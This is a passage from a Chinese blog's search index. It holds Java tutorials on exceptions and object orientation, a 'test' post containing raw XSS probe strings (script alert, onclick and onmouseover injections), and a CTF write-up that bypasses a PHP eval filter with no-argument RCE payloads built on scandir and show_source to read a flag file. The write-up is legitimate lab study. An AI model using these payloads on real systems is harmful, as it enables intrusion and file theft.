<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>test</title>
      <link href="2021/04/23/test/"/>
      <url>2021/04/23/test/</url>
      
        <content type="html"><![CDATA[<p>test</p><span id="more"></span><ol><li>```html<br>“<script>alert(document.domain);</script><b>“<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. &#96;&#96;&#96;html</span><br><span class="line">   1&quot;&gt;&lt;script&gt;alert(document.domain);&lt;&#x2F;script&gt;&lt;&quot;</span><br><span class="line">   &quot; onclick&#x3D;alert(document.domain)&gt;</span><br><span class="line">   &quot; onmouseover&#x3D;alert(document.domain)&gt;</span><br></pre></td></tr></table></figure></b></li></ol><p>这只是个测试</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java异常处理</title>
      <link href="2021/04/21/java%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"/>
      <url>2021/04/21/java%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>异常抛出处理，还有常见的异常学习</p><span id="more"></span><h2 id="Error-与-Exception"><a href="#Error-与-Exception" class="headerlink" title="Error 与 Exception"></a>Error 与 Exception</h2><p>程序在运行过程中，可能会遇到一些意外问题，我们称之为异常，英文是：Exception，意思是例外。</p><p>异常指程序运行中出现的不期而至的各种状况，如:<strong>文件找不到、网络连接失败、非法参数</strong>等</p><p>异常发生在程序运行期间，它影响了正常的程序执行流程</p><p>例如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exception;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Demo01().a();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line">        b();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">b</span><span class="params">()</span></span>&#123;</span><br><span class="line">        a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/04/21/java%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20210421205232424.png" class="lazyload" data-srcset="/2021/04/21/java%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20210421205232424.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210421205232424"></p><ul><li>检查性异常：最具代表的检查行异常是用户错误（不合理的输入）或者问题引起的异常，这是程序员无法预见的。</li><li>运行时异常：运行时异常是可能被程序员避免的异常。运行时异常可以在编译时可能被忽略（写的时候没错，一运行就报异常）</li><li>错误ERROR: 错误不是异常，而是脱离程序员控制的问题，往往在编译的时候也检查不到 </li></ul><h3 id="异常处理框架"><a href="#异常处理框架" class="headerlink" title="异常处理框架"></a>异常处理框架</h3><p>Java把异常当对象来处理，定义了一个基类 java.lang.Throwable 作为所有异常的超类</p><p>在Java的API中定义了许多异常类，分为 <strong>Error 和Exception</strong></p><p><img src="/2021/04/21/java%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20210421212605965.png" class="lazyload" data-srcset="/2021/04/21/java%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/image-20210421212605965.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210421212605965"></p><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><p>Error类对象由Java虚拟机生成并抛出，大多数错误与代码编写者所执行的操作无关</p><p>Java虚拟机运行错误（VirtualMachineError），当JVM不在有继续执行操作所需要的的内存资源时，将出现<code>OutOfMemoryError</code>。当这些异常发生时，Java虚拟机（JVM）一般会选择线程终止</p><p>当虚拟机执行应用时，如果类定义错误（<code>NoClassDefFoundError</code>）、连接错误（<code>LinkageError</code>）。这些错误是不可查的，因为他们在应用程序的控制和处理能力之外，而且绝大多数程序运行时不允许出现</p><h3 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h3><p>在Exception分支中有个重要的子类RuntimeException(运行时异常)</p><ul><li>ArrayIndexOutOfBoundsException （数组下标越界异常）</li><li>NullPointerException （空指针异常）</li><li>ArithmeticException （算数异常）</li><li>MissingResourceException （丢失资源异常）</li><li>ClassNotFoundException (找不到类) 异常</li></ul><p>这些异常一般由程序逻辑错误导致，程序可以从逻辑角度尽可能避免这些异常</p><p><strong>Error和Exception的区别：Error通常是灾难性错误，程序无法控制和处理，一但出现，JVM一般选择终止现成；Exception通常情况下被程序处理的，并且在程序中应该尽可能的去处理这些异常</strong></p><h2 id="捕获和抛出异常"><a href="#捕获和抛出异常" class="headerlink" title="捕获和抛出异常"></a>捕获和抛出异常</h2><p>处理异常五个关键字</p><p><code>try(监控) catch(捕获) finally(善后) throw(主动抛出) throws(向上抛出)</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exception;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a =<span class="number">1</span> ;</span><br><span class="line">        <span class="keyword">int</span> b = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// catch 捕获异常: 从子类到父类 ，并且每次只能捕获一个异常，只是可以捕获的异常类型不同</span></span><br><span class="line">        <span class="comment">//Ctrl + Alt +T</span></span><br><span class="line">        <span class="keyword">try</span>&#123; <span class="comment">//监控区域</span></span><br><span class="line">            System.out.println(a/b);</span><br><span class="line">            <span class="keyword">new</span> Test().a();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(StackOverflowError e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;溢出了&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(ArithmeticException e)&#123; <span class="comment">//catch 捕获异常</span></span><br><span class="line">            System.out.println(<span class="string">&quot;程序出现异常,变量b不能为零&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;处理善后&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//finally 可以不要finally, finally 常用于关闭IO,资源</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span></span>&#123;b();&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">b</span><span class="params">()</span></span>&#123;a();&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exception;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">new</span> Test2().test(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(ArithmeticException e)&#123;</span><br><span class="line">            e.printStackTrace(); <span class="comment">//打印错误的栈信息</span></span><br><span class="line">            System.exit(<span class="number">1</span>); <span class="comment">//结束程序</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 假设这个方法，处理不了这个异常。方法向上抛出这个异常 throws</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> a , <span class="keyword">int</span> b)</span> <span class="keyword">throws</span> ArithmeticException</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(b==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span>  <span class="keyword">new</span> ArithmeticException(); <span class="comment">//符合异常特征,主动抛出异常，一般在方法中使用</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="自定义异常"><a href="#自定义异常" class="headerlink" title="自定义异常"></a>自定义异常</h2><p>使用Java内置的异常类可以描述在编程时出现的大部分异常情况。除此之外，用户还可以自定义异常。用户自定义异常类，只要继承Exception类即可</p><p>在程序中使用自定义异常类，有以下几个步骤：</p><ul><li>创建自定义异常类</li><li>在方法中通过throw关键字抛出异常对象</li><li>如果再当前抛出异常的方法中处理异常，可以使用try-catch语句捕获异常并处理；否杂而在方法的声明处通过throws关键字指明抛出给方法调用者的异常，进行下一步操作</li><li>在出现异常方法的调用者中捕获并处理异常</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exception.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span>&#123;</span><br><span class="line">    <span class="comment">//传递数字&gt;10</span></span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">int</span> detail;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyException</span><span class="params">(<span class="keyword">int</span> a)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.detail = a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MyException&#123;&quot;</span>+<span class="string">&quot;detail=&quot;</span>+detail+<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> exception.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">( <span class="keyword">int</span> a)</span> <span class="keyword">throws</span>  MyException</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(a&gt;<span class="number">10</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span>  <span class="keyword">new</span> MyException(a);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            test(<span class="number">11</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MyException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;MyException&quot;</span> +<span class="string">&quot;=&gt;&quot;</span> +e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><ul><li>处理运行时异常，采用逻辑去合理规避同时辅助try-catch处理</li><li>在多重catch块后面，可以加一个catch（Exception）来处理可能会被遗漏的异常</li><li>对于不确定的代码，可以加上try-catch，处理潜在的异常</li><li>尽量去处理异常，少只是通过调用<code>printStackTrace()</code>打印输出</li><li>具体如何处理异常，根据不同的业务需求和异常类型去决定</li><li>尽量添加finally语句块儿去释放占用的资源</li></ul>]]></content>
      
      
      <categories>
          
          <category> java学习之路 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 异常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF2019-禁止套娃</title>
      <link href="2021/04/17/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/"/>
      <url>2021/04/17/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/</url>
      
        <content type="html"><![CDATA[<p>无参数rce 绕过限制</p><span id="more"></span><h3 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h3><p>扫描目录，发现.git目录</p><p><img src="/2021/04/17/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/image-20210417113628493.png" class="lazyload" data-srcset="/2021/04/17/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/image-20210417113628493.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210417113628493"></p><p>猜测存在git泄露，我这里采用的是dumpall工具(很好用，像开发者致敬)</p><p><img src="/2021/04/17/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/image-20210417113712686.png" class="lazyload" data-srcset="/2021/04/17/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/image-20210417113712686.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210417113712686"></p><p>得到了源码</p><h3 id="0x02-代码审计"><a href="#0x02-代码审计" class="headerlink" title="0x02 代码审计"></a>0x02 代码审计</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">//过滤了一些php的伪协议</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;  <span class="comment">//无参数过滤</span></span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">//对一些字符的过滤</span></span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>/[a-z,_]+\((?R)?\)/</code>这个正则表达式在匹配一些无参函数的嵌套且这些函数的函数名只能有字母下划线构成</p><p>这种先想办法扫一下目录利用scandir()吧，显然命令执行函数不太行，需要参数</p><h3 id="0x03-列目录找文件"><a href="#0x03-列目录找文件" class="headerlink" title="0x03 列目录找文件"></a>0x03 列目录找文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    print_r(dirscan(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">var_dump(dirscan(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样子的话，需要构造<code>.</code>了</p><h4 id="第一种方法-current-localeconv"><a href="#第一种方法-current-localeconv" class="headerlink" title="第一种方法 current(localeconv)"></a>第一种方法 current(localeconv)</h4><p><strong>先来介绍几个函数</strong></p><ul><li>localeconv() 函数返回一包含本地数字及货币格式的信息的数组，数组的第一项就是<code>.</code></li><li>current() 返回数组中的当前但愿，某人第一个值</li><li>pos() current()的别名</li><li>end() 将内部指针指向数组中的最后一个元素，并输出</li><li>next() 将内部指针指向数组的下一个元素，并输出</li><li>prev() 将内部指针指向数据的上一个元素，并输出</li><li>reset() 将内部指针指向数组的第一个元素，并输出</li><li>each() 返回当前元素的键名和简直，内部指针向前移动</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(scandir(current(localeconv)));</span><br></pre></td></tr></table></figure><p><img src="/2021/04/17/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/image-20210417124120739.png" class="lazyload" data-srcset="/2021/04/17/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/image-20210417124120739.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210417124120739"></p><h4 id="第二种方法-phpversion"><a href="#第二种方法-phpversion" class="headerlink" title="第二种方法 phpversion()"></a>第二种方法 phpversion()</h4><blockquote><p>phpversion() 返回PHP版本 如 7.3.5</p><p>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))) 返回 .</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))));</span><br></pre></td></tr></table></figure><p><img src="/2021/04/17/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/image-20210417125205598.png" class="lazyload" data-srcset="/2021/04/17/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/image-20210417125205598.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210417125205598"></p><h3 id="0x04-读flag文件"><a href="#0x04-读flag文件" class="headerlink" title="0x04 读flag文件"></a>0x04 读flag文件</h3><h4 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h4><p><strong>介绍几个函数</strong></p><ul><li>array_reverse()  该函数将数据以相反的顺序返回</li><li>array_rand(array_flip())  array_filp交换数组的键和值，array_rand 返回数组的一个随机键名</li><li>readfile() 读文件</li><li>highlight_file()或者 别名函数 show_source() 读文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(show_source(next(array_reverse(scandir(current(localeconv()))))));</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp&#x3D;print_r(show_source(array_rand(array_flip(scandir(current(localeconv())))))); &#x2F;&#x2F;这个payload有随机因数</span><br></pre></td></tr></table></figure><h4 id="第二种方法-session-id-session-start"><a href="#第二种方法-session-id-session-start" class="headerlink" title="第二种方法   session_id(session_start())"></a>第二种方法   session_id(session_start())</h4><blockquote><p><code>session_start()</code> 告诉PHP使用session,PHP默认不主动使用session</p><p><code>session_id()</code> 获得当前的session_id, 可以通过cookie传PHPSESSID来控制</p></blockquote><p>于是构造</p><p><img src="/2021/04/17/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/image-20210417131107535.png" class="lazyload" data-srcset="/2021/04/17/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/image-20210417131107535.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210417131107535"></p><h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><p><a href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">https://www.cnblogs.com/wangtanzhi/p/12260986.html</a></p><p><a href="https://www.wh1teze.top/articles/2020/02/08/1581153047695.html">https://www.wh1teze.top/articles/2020/02/08/1581153047695.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 无参数rce </tag>
            
            <tag> git泄露 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java面向对象</title>
      <link href="2021/04/11/java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
      <url>2021/04/11/java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<p>学习java面向对象的思想</p><span id="more"></span><h3 id="初始面向对象"><a href="#初始面向对象" class="headerlink" title="初始面向对象"></a>初始面向对象</h3><h4 id="面向对象-amp-面向过程"><a href="#面向对象-amp-面向过程" class="headerlink" title="面向对象 &amp; 面向过程"></a>面向对象 &amp; 面向过程</h4><p>面向过程</p><ul><li>步骤清晰，顺序执行</li><li>面对过程适合处理一些较为简单的问题</li></ul><p>面向对象</p><ul><li>分类的思想木事，思考问题首先结局问题需要分成哪些类，然后对这些分类独立思考。分类下的细节还是通过面向过程的思索。</li><li>对于描述复杂的事物，为了从宏观上把握、从整体上合理分析，我们需要使用面向对象的思路来分析整个系统。但是，具体到微观操作，仍然需要面对过程的思路去处理</li></ul><h4 id="面向对象编程（Object-Oriented-Programming-OOP）"><a href="#面向对象编程（Object-Oriented-Programming-OOP）" class="headerlink" title="面向对象编程（Object-Oriented Programming, OOP）"></a>面向对象编程（Object-Oriented Programming, OOP）</h4><p>本质是：以类的方式组织代码，以对象的方式组织(封装)数据</p><p>面向对象三大特性： <strong>封装、继承、多态</strong></p><p>类是对象的模板，是对对象的抽象</p><h3 id="类与对象的创建"><a href="#类与对象的创建" class="headerlink" title="类与对象的创建"></a>类与对象的创建</h3><p>类是一种抽象的数据类型，它是对某一类事物整体描述/定义，但并不代表某一个具体的事物</p><p>对象是抽象概念的具体实例</p><p>使用new关键字来创建对象</p><p>使用new关键字创建的时候，除了分配内存空间，还会给创建好的对象进行默认的初始化以及对类中的构造器的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo01;</span><br><span class="line"></span><br><span class="line"><span class="comment">//学生类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="comment">//属性：字段</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">study</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span 